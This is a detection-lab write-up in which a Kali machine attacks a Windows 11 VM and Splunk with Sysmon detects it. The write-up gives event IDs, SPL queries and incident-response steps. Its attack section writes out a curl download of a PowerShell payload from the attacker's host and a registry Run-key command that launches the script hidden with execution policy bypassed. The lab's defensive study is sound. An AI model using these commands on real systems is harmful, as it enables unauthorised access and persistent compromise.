

# Detection Usecase 3 : Persistence via Registry keys


# Scenario Summary: 

An Attacker has attempted to logged in into the System by using credentials of a user and able to download a suspicious ps1 file,  
then runs a command to edit the registry and hide the malware in the run folder so that is get run after every time the System starts.  

# Attack Steps:

Here, Virtual Windows 11 is the victim where universal forwarder is running,  
and Virtual Kali Linux is the attacker.
- The Attack was simulated by Kali Linux on Windows as follows: 

1) Attacker Login to Victim Machine via SSH and uploaded a PowerScript on it.  
```
ssh sshuser@192.168.0.103
```  
```
curl http://192.168.0.106/fileless.ps1 -o fileless.ps1
```
2) Then executed the following command to hide the ps1 in run folder of the System.  
```
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"  
-Name "Updater" -Value "powershell -nop -w hidden -ExecutionPolicy Bypass  
-File C:\Users\sshuser\fileless.ps1"
``` 
3) Now every time the user logged in the System the attacker will get the shell access of the System, hence gain persistence on the System.  
![attack](<logs/Screenshot_2025-06-05_07_27_47 copy.png>)


 ******************************

- Tools Used:  
    - Attacking Tool : PowerShell Script, SSH, regedit, msfvenom, metasploit
    - SIEM : Splunk Free  
    - Log Source : Windows Security Event Logs, Sysmon


 ******************************
 ******************************

# Event ID / Data Source Mapping:

| Source                    | EventCode | Description                      |
|---------------------------|-----------|----------------------------------|
| WinEventLog : Security    | 4624      | Successful logon                 |
| WinEventLog : Sysmon      | 1         | Process Creation                 |
| WinEventLog : Sysmon      | 3         | Network Connection Detected      |
| WinEventLog : Sysmon      | 11        | File Creation                    |
| WinEventLog : Sysmon      | 13        | Registry Value Modification      |


 ******************************
 ******************************

# Detection Query / Logic:
```spl 
- Search - Logged in attempt
index=* EventCode=3 OR EventCode=4624 LogonType=8 OR LogonType=10
```
```spl 
- Search - Command Execution or file creation
index=* EventCode=1 OR EventCode=11
```
```spl 
- Search - Registry Modification
index=* EventCode=13
```


 ******************************
 ******************************

# Sample Alert Screenshot

1) User has logged in.  

![login1](<logs/Screenshot 2025-06-05 162503.png>)  
![login2](<logs/Screenshot 2025-06-05 162520.png>)  
![get system32](<logs/Screenshot 2025-06-05 162552.png>)


2) Then attempted to download a ps1 file.  

![download](<logs/Screenshot 2025-06-05 162748.png>)  
![created](<logs/Screenshot 2025-06-05 162802.png>)

3) After that runs powershell and execute registry modification.  

![pswh1](<logs/Screenshot 2025-06-05 162838.png>)  
![pwsh2](<logs/Screenshot 2025-06-05 162957.png>)

4) The modification can also be seen using Autoruns tool.  

![autoruns](<logs/Screenshot 2025-06-05 170740.png>)


 ******************************
 ******************************

# Analyst Notes / Recommendations:

1) What Should an Analyst do ? 

-> If there is Registry Modification, then :
    -> Confirm the Detection - Verify logs and see the indicators(e.g.,Event ID : 4625(unsuccessful login), 11(File Creation), 1(Process Creation/Command Execution)), try to correlate it with unexpected login or unusual user behavior.  
    -> Contain the Threat - Isolate the system and stop if any malicious processes is running and disable the user account involved in the attack.  
    -> used tool like Autoruns or manually delete the unusual Registry Modification.  
    -> Delete any downloaded files, check for scheduled tasks or any lateral movement activity.  
    -> Collect the Evidence.  
    -> Report & Document the incident & Improve.  

# Detection Status

 -> Successfully Detected.  
